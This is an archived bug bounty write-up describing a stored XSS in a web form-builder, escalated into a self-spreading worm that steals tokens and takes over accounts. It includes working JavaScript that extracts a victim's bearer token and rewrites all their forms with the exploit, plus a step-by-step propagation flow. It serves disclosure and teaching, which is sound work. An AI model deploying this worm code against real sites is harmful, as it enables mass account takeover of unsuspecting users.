# P1 XSS?

- **Source URL:** https://medium.com/@khode4li/p1-xss-e569b0cb2bf8?source=rss------bug_bounty-5
- **Fetched from:** https://web.archive.org/web/20250201210346/https://medium.com/@khode4li/p1-xss-e569b0cb2bf8
- **Fetched:** 2026-11-24
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/4065 (id 4065)
- **Method:** wayback-machine-snapshot readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
Hello to all you curious hackers. It’s been two weeks since I discovered this vulnerability, and ever since, I’ve been planning to write about it. Yesterday, one of my friends wrote his first write-up, which motivated me to start my own writing journey. Be sure to check out my friend’s piece as well.

I’ve always had the habit of reporting XSS vulnerabilities without exploiting them, which often resulted in a lower impact and, consequently, a lower bounty reward. After learning more, I realized that I could easily perform Account Takeover (ATO) using the previous XSS vulnerabilities and increase the impact to P2. Can you imagine the feeling I had when I realized that? 😂😂

So, I decided to exploit it as much as possible and maximize the impact. And the result is this write-up that you’re about to read.

So, let’s get started!

# Phase 1: working with the program

I was working with the program in a regular manner, just to see how it operates. I realized that the program consisted of two parts: the front end, which was on the main domain of the website, and the back end, which was on a subdomain named `api`.

After logging in, a cookie was set for us on the main website. Later, based on that cookie, a token was reflected on the main page for communication with the backend. I thought to myself, okay, this is getting interesting. If I find an XSS, I can easily perform some dangerous actions.

I spent some time working with the website to explore and understand its features and functionalities. After exploring for a while, I discovered a feature that allowed users to create forms.

# Phase 2: interesting part

This feature enabled users to generate forms and inputs using drag-and-drop, resembling something like Elementor in WordPress, if I’m not mistaken. Up to this point, it was normal because these kinds of functionalities usually send the data of such forms to the server in JSON format. Later, the server uses the JSON data to render the form.

However, when I intercepted the request, I saw something interesting. The inputs were being sent to the server as raw HTML and were directly displayed on the form on the page.

the request data was something like this:

```
PUT /subscribe-form/{form-id}
Host: api.target.com
Authorization: bearer {token}
..
..
..
{"html":"<div class\"...\"> </div> "}
```
And then whenever you open this link: **target.com/en/v5/subscribe-form/view/{form-id}**

# Phase 3: exploitation

At this point, I realized that I had a stored XSS, giving me the ability to manipulate the victim’s account freely. I could easily send a request to the main page and retrieve the user’s token from the response. But am I going to stop here? Definitely not.

I explored the website further and played around with its features. Unfortunately, I didn’t come across anything significant. At this point, I took a break to relax and clear my mind.

After about 3 hours of rest, it occurred to me to come back and use the Logger++ extension in Burp Suite to search for the cookies stored on the main site and see what I could find. Yes, I found an endpoint that reflects the user’s cookie in its header. The header looked like this: `X-User-Session: {user-auth-cookie}`

So now, I can easily take over the victim’s account. But is it over here? Again, no.

I contemplated ways to elevate the impact beyond its current level, and that’s when I recalled an old write-up titled `Worm XSS`. The write-up is quite old, and I don't have the link; otherwise, I would have shared it. I won't go into details about it because the exploitation method is exactly the same.

Well, the scenario was like this: when the XSS triggers, a JS file from my server was loaded, containing the exploit. (Just to shorten the payload used on the website). JavaScript then sent a request to the main page of the website to extract the user’s token. Then, it sent a request on behalf of the victim to the website to check if the person had a form. If so, it retrieved the list of form IDs.

Up to now, the JavaScript source code is something like the following:

```
function get_list_ids(token){
var xhr = new XMLHttpRequest();
// Define the URL with query parameters
var url = 'https://api.target.com/subscribe-form?limit=100&offset=0&searchName=&orderBy=createdAt&orderType=desc';
// Open a GET request to the URL
xhr.open('GET', url, true);
// Set the authorization header
xhr.setRequestHeader('Authorization', 'Bearer '+token);
// Set up an event handler for when the request is complete
xhr.onreadystatechange = function() {
  if (xhr.readyState === 4) {
    if (xhr.status >= 200 && xhr.status < 300) {
      // Parse the JSON response
      var responseText = xhr.responseText;
      var jsonResponse = JSON.parse(responseText);
      // Access the "list" array in the JSON response
      var listArray = jsonResponse.result.list;
      // Extract the list IDs into an array
      var listIds = listArray.map(function(item) {
        return item.id;
      });
      // Output the list IDs as an array
      listIds.forEach(function(id) {
  infect_the_form(id,token);
});;
    } else {
      // Handle error here
      console.error('XHR request failed with status:', xhr.status);
    }
  }
};
// Send the XHR request
xhr.send();
}
//document.write("<h1>Loading, please wait... !</h1>");
var xhr = new XMLHttpRequest();
xhr.open('GET', 'https://target.com/en/v5/', true);
xhr.withCredentials = true;
xhr.onreadystatechange = function() {
  if (xhr.readyState === 4) {
    if (xhr.status >= 200 && xhr.status < 300) {
      // You can also access all headers as a string
   var auth_cookie = xhr.getResponseHeader('x-session-id')
      var token = xhr.responseText.match(/<script>window\.globalAgAccessToken = "(.*)";<\/script>/)[1];
   get_list_ids(token);
// Other response handling code goes here
    } else {
      // Handle error here
      console.error('XHR request failed with status:', xhr.status);
    }
  }
};
xhr.send();
```
**Since the code is written by AI, you’ll have to bear with unnecessary comments and error handling.😂**

**In addition to all that, you’ll have to endure my terrible choice of variable and function names. 😂**

Since the exploit code is from two weeks ago, I don’t know what the fuck is going on in the **get\_list\_ids****infect\_the\_form****infect\_the\_form**

infect\_the\_form:

```
function infect_the_form(id,token){
var xhr = new XMLHttpRequest();
// Define the URL
var url = 'https://api.target.com/subscribe-form/' + id;
// Open a PUT request to the URL
xhr.open('PUT', url, true);
// Set the authorization header
xhr.setRequestHeader('Authorization', 'Bearer '+token);
// Set the Content-Type header to specify JSON data
xhr.setRequestHeader('Content-Type', 'application/json');
var jsonData = {"html":"MY_EXPLOIT_IS_HERE"};
// Convert the JSON data to a string
var jsonDataString = JSON.stringify(jsonData);
// Set up an event handler for when the request is complete
xhr.onreadystatechange = function() {
  if (xhr.readyState === 4) {
    if (xhr.status >= 200 && xhr.status < 300) {
      // Request was successful
      alert('form '+id+' infected');
    } else {
      // Handle error here
      console.error('XHR request failed with status:', xhr.status);
    }
  }
};
// Send the XHR request with the JSON data in the body
xhr.send(jsonDataString);
}
```
Well, now I can easily infect all the forms created by other users. And if I add this exact exploit code to those forms, anyone who visits forms created by the victim will get infected, and this loop continues indefinitely. And if we add a bit of danger to it, so that in addition to infecting the form, we can also take over the user’s account, then we can have a P1 XSS.

I don’t know if it’s mass account takeover or not, but I’m sure this is something dangerous.

I won’t write the account takeover code since it’s just a matter of sending a request to the mentioned endpoint and extracting the user’s session from the header. That simple.

Let’s quickly review the flow of the vulnerability once again.

1. We place the exploit code on our form.
2. We provide the victim with the link to the form.
3. The exploit is executed, and all forms created by the victim get infected. Additionally, the victim’s account is taken over by the attacker.
4. Anyone who views the victim’s form, provided they have a form, will get infected by the exploit, and their accounts will be taken over by the attacker.
5. And this loop continues indefinitely.

I hope you’ve learned something new, and I’ve been able to give back a bit to the community from which I’ve learned.
